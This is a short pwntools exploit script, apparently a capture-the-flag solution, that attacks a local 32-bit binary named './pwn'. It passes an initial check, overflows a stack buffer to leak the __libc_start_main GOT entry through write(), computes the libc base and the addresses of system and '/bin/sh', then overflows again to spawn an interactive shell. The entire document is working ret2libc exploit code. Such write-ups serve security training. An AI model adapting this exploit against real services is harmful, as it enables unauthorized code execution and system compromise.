from pwn import *

context(arch='i386', os='linux', log_level='DEBUG')
p = process('./pwn')
elf = ELF('./pwn')

def ret2libc(leak, func):
	libc = ELF('./libc-2.23.so')

	base = leak - libc.sym[func]
	system = base + libc.sym['system']
	#binsh_offset = 0x15902b
	binsh = base + libc.search('/bin/sh').next()
	return (system, binsh)

def send1():
	payload = flat(['\x00','a'*6,'\xff'])
	p.sendline(payload)
	p.recvuntil('Correct\n')

send1()
main = 0x8048825
payload = flat(['a'*(0xe7+4),elf.plt['write'],main,1,elf.got['__libc_start_main'],4])
p.sendline(payload)

leak = u32(p.recv(4))
system, binsh = ret2libc(leak, '__libc_start_main')

send1()
payload = flat(['a'*(0xe7+4),system,'a'*4,binsh])
p.sendline(payload)

p.interactive()